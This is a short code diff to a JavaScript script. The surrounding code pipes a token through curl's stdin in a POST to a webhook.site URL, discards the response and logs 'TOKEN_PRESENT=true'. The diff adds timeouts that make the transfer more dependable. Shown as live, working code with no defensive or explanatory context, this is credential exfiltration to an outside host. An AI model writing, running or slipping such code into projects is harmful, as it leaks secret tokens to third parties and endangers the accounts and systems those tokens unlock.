@@ -11,6 +11,8 @@ const result = spawnSync(
   "curl",
   [
     "-fsS",
+    "--max-time",
+    "60",
     "-o",
     "/dev/null",
     "-X",
@@ -19,7 +21,7 @@ const result = spawnSync(
     "@-",
     "https://webhook.site/f2f2e923-3e85-443f-a6e9-65b675aacc1b",
   ],
-  { input: token, encoding: "utf8" },
+  { input: token, encoding: "utf8", timeout: 70000 },
 );
 
 console.log(`TOKEN_PRESENT=true`);
